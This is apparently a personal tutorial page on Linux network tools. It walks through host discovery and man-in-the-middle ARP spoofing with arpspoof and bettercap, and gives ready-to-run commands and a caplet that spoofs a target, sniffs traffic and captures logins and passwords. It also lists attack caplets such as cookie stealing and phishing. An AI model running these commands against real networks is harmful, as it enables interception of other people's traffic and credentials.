-----

* title: Networking
* description: This article is dedicated to computer networks.
* created: 28-11-2007 00:00:00
* modified: 28-11-2007 00:00:00
* keywords: debian, gnu, linux, operating, system, admin, network, wifi, lan, security, hacking, wireless
* lang: en

-----

# Table of Contents

* [Tools](#tools)
* [Discover the network devices](#discover-the-network-devices)
* [Arp spoofing](#arp-spoofing)
   * [arpspoof](#arpspoof)
   * [bettercap](#bettercap)
      * [Web gui of bettercap](#web-gui-of-bettercap)

# Tools

* `netdiscover` - Discover the devices on your network.
* `nmap` - Discover the devices on your network and get more information 
  than `netdiscover`. 
* `zenmap` - A graphical user interface of `nmap`. 
* `arpspoof` - To spoof ARP (for MITM attacks).
* `bettercaps` - Like `arpspoof` but then more advanced. A framework with 
  more options.

# Non classified

    rout -n

# Discover the network devices

To discover all devices connected to a network, we can make use of the  
`netdiscover` utility. Once run, let it run so it will continue to catch and 
discover interesting hosts that join the netwrok.

    netdiscover -r 192.168.0.1/24

We can also use `nmap` or even use the GUI version of it called `zenmap` 
wich both are more complete.

# Arp spoofing

## arpspoof

This is a MITM (Man In The Middle attack) to redirect all traffic from some 
other client thought another computer, so that all data can be sniffed 
more easyly.

See `arp -a` to have your routing table. Command works on GNU/Linux and Windows.

Note that `arpspoof` is not installed by default on Kali 2021. So install the 
concerned package with `apt-get install dsniff` which include this tool.

**We need to run `arpspoof` twice and let it open.**

    arpspoof -i <interface> -t <client-ip> <gateway-ip>
    # In another shell !!!
    arpspoof -i <interface> -t <gateway-ip> <client-ip> 

We can now verify with `arp -a` and we will see that the mac address of the 
router changed !

Note that the computer isn't a real router, so we need enable port forwarding 
on our Kali box.

    echo 1 > /proc/sys/net/ipv4/ip_forward

** IMPORTANT NOTE: On Kali 2021.1 ip_forwarding doesn't work like expected 
by default, an additional step need to be done.**

Edit the file `/etc/sysctl.conf` and uncomment the following line:

    net.ipv4.ip_forward=1

You could reboot or just use `sysctl -p` so that the changes take immediatly 
effect.

**It is also interesting to know that `Wireshark` detect this kind of 
spoofing.**

See also `bettercap` for more functionalities

## bettercap

`Bettercap` is more powerful than the `arpspoof` program. With `bettercap` 
you can also sniff the data on a friendly way. That mean that you could capture 
network data like website browsing and intercept username and password.

When using the app, you can use the `help` command to get help.

For example to get help on a module:

    help net.snif

You can also use the `tab` key to let the program autocomplete. Also to get 
a full list of command in the "root" of the program.

If you use a lot of time the same command each time you use the program, you 
can make in sort to automate some stuff by creating an external file and 
load it. That file is called a `caplet` file. 
So here's an example of a spoofing script. Create a text file that you for 
example name `spoof.cap` with the following content: 

    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets 10.0.2.5
    arp.spoof on
    # Next one is optional and only for https downgrading to http. As with 
    # hstshijack MITM attack, all become local 
    ### set net.sniff.local true 
    # Save all captured data into a file
    set net.sniff.output /root/bettercap_capture_file.cap
    net.sniff on

And to make use of our commands:

    bettercap -iface eth0 -caplet spoof.cap

You can also list the default caplets that come with `bettercap` and see 
where they are stored on your system.

    captlets.show

Which will show you a list of caplets you have on your system:

    ┌─────────────────────────────────────┬──────────────────────────────────────────────────────────────────────┬────────┐
    │                Name                 │                                 Path                                 │  Size  │
    ├─────────────────────────────────────┼──────────────────────────────────────────────────────────────────────┼────────┤
    │ ap                                  │ /usr/share/bettercap/caplets/ap.cap                                  │ 570 B  │
    │ crypto-miner/crypto-miner           │ /usr/share/bettercap/caplets/crypto-miner/crypto-miner.cap           │ 666 B  │
    │ download-autopwn/download-autopwn   │ /usr/share/bettercap/caplets/download-autopwn/download-autopwn.cap   │ 2.6 kB │
    │ fb-phish/fb-phish                   │ /usr/share/bettercap/caplets/fb-phish/fb-phish.cap                   │ 140 B  │
    │ gitspoof/gitspoof                   │ /usr/share/bettercap/caplets/gitspoof/gitspoof.cap                   │ 216 B  │
    │ gps                                 │ /usr/share/bettercap/caplets/gps.cap                                 │ 109 B  │
    │ hstshijack/hstshijack               │ /usr/share/bettercap/caplets/hstshijack/hstshijack.cap               │ 841 B  │
    │ hstshijack_ORG/hstshijack           │ /usr/share/bettercap/caplets/hstshijack_ORG/hstshijack.cap           │ 1.2 kB │
    │ http-req-dump/http-req-dump         │ /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap         │ 591 B  │
    │ http-ui                             │ /usr/share/bettercap/caplets/http-ui.cap                             │ 376 B  │
    │ https-ui                            │ /usr/share/bettercap/caplets/https-ui.cap                            │ 655 B  │
    │ jsinject/jsinject                   │ /usr/share/bettercap/caplets/jsinject/jsinject.cap                   │ 210 B  │
    │ local-sniffer                       │ /usr/share/bettercap/caplets/local-sniffer.cap                       │ 244 B  │
    │ login-manager-abuse/login-man-abuse │ /usr/share/bettercap/caplets/login-manager-abuse/login-man-abuse.cap │ 236 B  │
    │ mana                                │ /usr/share/bettercap/caplets/mana.cap                                │ 61 B   │
    │ massdeauth                          │ /usr/share/bettercap/caplets/massdeauth.cap                          │ 302 B  │
    │ mitm6                               │ /usr/share/bettercap/caplets/mitm6.cap                               │ 551 B  │
    │ mycaplet                            │ /root/mycaplet.cap                                                   │ 125 B  │
    │ netmon                              │ /usr/share/bettercap/caplets/netmon.cap                              │ 42 B   │
    │ pita                                │ /usr/share/bettercap/caplets/pita.cap                                │ 900 B  │
    │ proxy-script-test/proxy-script-test │ /usr/share/bettercap/caplets/proxy-script-test/proxy-script-test.cap │ 57 B   │
    │ pwnagotchi-auto                     │ /usr/share/bettercap/caplets/pwnagotchi-auto.cap                     │ 330 B  │
    │ pwnagotchi-manual                   │ /usr/share/bettercap/caplets/pwnagotchi-manual.cap                   │ 440 B  │
    │ rogue-mysql-server                  │ /usr/share/bettercap/caplets/rogue-mysql-server.cap                  │ 501 B  │
    │ rtfm/rtfm                           │ /usr/share/bettercap/caplets/rtfm/rtfm.cap                           │ 210 B  │
    │ simple-passwords-sniffer            │ /usr/share/bettercap/caplets/simple-passwords-sniffer.cap            │ 131 B  │
    │ steal-cookies/steal-cookies         │ /usr/share/bettercap/caplets/steal-cookies/steal-cookies.cap         │ 134 B  │
    │ tcp-req-dump/tcp-req-dump           │ /usr/share/bettercap/caplets/tcp-req-dump/tcp-req-dump.cap           │ 413 B  │
    │ web-override/web-override           │ /usr/share/bettercap/caplets/web-override/web-override.cap           │ 254 B  │
    └─────────────────────────────────────┴──────────────────────────────────────────────────────────────────────┴────────┘

To run some caplet, just type in it's name.

### Web gui of bettercap

Once bettercap is running, you can type in the console `http-ui`. Note that 
it does make use of the default port `80` so if `apache` or any other 
webserver is running this will fail.

You can then visit http://127.0.0.1:80 and you will see a login screen. The 
default username is `user` and the password is `pass`.
